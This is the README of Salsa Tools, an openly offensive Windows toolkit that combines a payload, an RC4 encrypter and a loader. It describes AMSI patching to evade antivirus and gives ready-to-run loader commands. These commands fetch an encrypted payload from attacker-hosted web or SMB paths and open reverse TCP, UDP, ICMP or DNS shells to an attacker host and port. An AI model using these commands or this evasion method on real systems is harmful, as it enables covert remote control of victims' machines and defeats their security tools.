![License](https://img.shields.io/badge/license-GNU-green.svg?style=flat-square)

```
   _____       __              ______            __    
  / ___/____ _/ /________ _   /_  __/___  ____  / /____
  \__ \/ __ `/ / ___/ __ `/    / / / __ \/ __ \/ / ___/
 ___/ / /_/ / (__  ) /_/ /    / / / /_/ / /_/ / (__  ) 
/____/\__,_/_/____/\__,_/    /_/  \____/\____/_/____/  

```
# Salsa Tools - An AV-Safe Reverse Shell dipped on bellota sauce  

Salsa Tools is a collection of three different tools that combined, allows you to get a reverse shell on steroids in any Windows environment without even needing PowerShell for it's execution. In order to avoid the latest detection techniques (AMSI), most of the components were initially written on C#. Salsa Tools was publicly released by Luis Vacas during his Talk “Inmersión en la explotación tiene rima” which took place during h-c0n in 9th February 2019.


## Features
    * TCP/UDP/ICMP/DNS/BIND     
    * AV Safe (17th February)
    * AMSI patchers
    * PowerShell execution 
    * ...
    
## Overview
Salsa-Tools is made from three different  ingredients:
    - EvilSalsa
    - EncrypterAssembly
    - SalseoLoader
And his behavior is as it follows:



## Setup
### Requirements
 - Visual Studio 2017 (or similar)
 - Python 2.7       
### Running la Salsa
#### Cooking EvilSalsa

```
   ___ __ __  ____  _            
  /  _]  |  ||    || |           
 /  [_|  |  | |  | | |           
|    _]  |  | |  | | |___        
|   [_|  :  | |  | |     |       
|     |\   /  |  | |     |       
|_____| \_/  |____||_____|       
                                 
  _____  ____  _     _____  ____ 
 / ___/ /    || |   / ___/ /    |
(   \_ |  o  || |  (   \_ |  o  |
 \__  ||     || |___\__  ||     |
 /  \ ||  _  ||     /  \ ||  _  |
 \    ||  |  ||     \    ||  |  |
  \___||__|__||_____|\___||__|__|
  
[+] That is our Payload
                                 
```

EvilSalsa is the key ingredient of this recipe. It contains the payload, which is executed on the system as it follows: as soon as the payloads starts, it runs `System.Management.Automation.dll` which creates a runspace . Within that runspace we have four types of shells (TCP / UDP / ICMP / DNS / BINDTCP). Once EvilSalsa is loaded, first thing first, the existence of `c:\windows\system32\amsi.dll` is checked. If it exists, it is patched using a home-cooked variant of CyberArk and Rastamouse bypasses.


#### Mixing EncrypterAssembly and Evilsalsa
```
  ______                             _            
 |  ____|                           | |           
 | |__   _ __   ___ _ __ _   _ _ __ | |_ ___ _ __ 
 |  __| | '_ \ / __| '__| | | | '_ \| __/ _ \ '__|
 | |____| | | | (__| |  | |_| | |_) | ||  __/ |   
 |______|_| |_|\___|_|   \__, | .__/ \__\___|_|   
     /\                   __/ | || |   | |        
    /  \   ___ ___  ___ _|___/|_|| |__ | |_   _   
   / /\ \ / __/ __|/ _ \ '_ ` _ \| '_ \| | | | |  
  / ____ \\__ \__ \  __/ | | | | | |_) | | |_| |  
 /_/    \_\___/___/\___|_| |_| |_|_.__/|_|\__, |  
                                           __/ |  
                                          |___/   
			  
 [+] Software that encrypts the payload using RC4
 [+] We have the version in python and the version in .exe
```

EncrypterAssembly can be used as a Python script or as a Exe binary.
It encrypts the previously generated EvilSalsa.

Python usage:
```
python encrypterassembly.py <FILE> <PASSWORD> <OUTPUT>
```
Executable usage:
```
Encrypterassembly.exe <FILE> <PASSWORD> <OUTPUT>
```
#### Bringing the Encrypted EvilSalsa to the table with SalseoLoader
SalseoLoader is in charge of loading the encrypted payload. Can be both compiled as a library or as an executable. If it is run as an executable, the chosen arguments must be provided when the executable is run. If it is compiled as a library, the descriptor "main" must be exported. Arguments are added using environmental variables.

Executable usage:
```
SalseoLoader.exe <PASSWORD> <PAYLOAD PATH> <SHELL TYPE> <LHOST> <LPORT>
```
Library usage on Powershell:
```
set $env:pass="password"
set $env:payload="http://10.10.10.10/evil.txt"
set $env:lhost="10.10.10.10"
set $env:lport="1337"
set $env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

Library usage on CMD:
```
set pass="password"
set payload="http://10.10.10.10/evil.txt"
set lhost="10.10.10.10"
set lport="1337"
set shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```

## Examples
### SalseoLoader (executable version) running Encrypted EvilSalsa (UDP mode) from a web server:
```
SalseoLoader.exe hc0n-2019 http://192.168.1.235/elmal.txt reverseudp 192.168.1.235 1337
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example1.png)

### SalseoLoader (executable version) running Encrypted EvilSalsa (TCP mode) locally:
```
SalseoLoader.exe hc0n-2019 C:\elmal.txt reversetcp 192.168.1.235 1337
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example2.png)
## SalseoLoader (executable version) running Encrypted EvilSalsa (ICMP mode) from SMB:
```
SalseoLoader.exe hc0n-2019 \\192.168.1.235\evil\elmal.txt reverseicmp 192.168.1.235 
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example3.png)

## SalseoLoader (executable version) running Encrypted EvilSalsa (DNS mode) locally:
## Example ReverseDNS
```
SalseoLoader.exe hc0n-2019 C:\elmal.txt reversedns 192.168.1.235 licordebellota.org
```
![](https://github.com/Hackplayers/Salsa-tools/blob/master/images/example4.png)


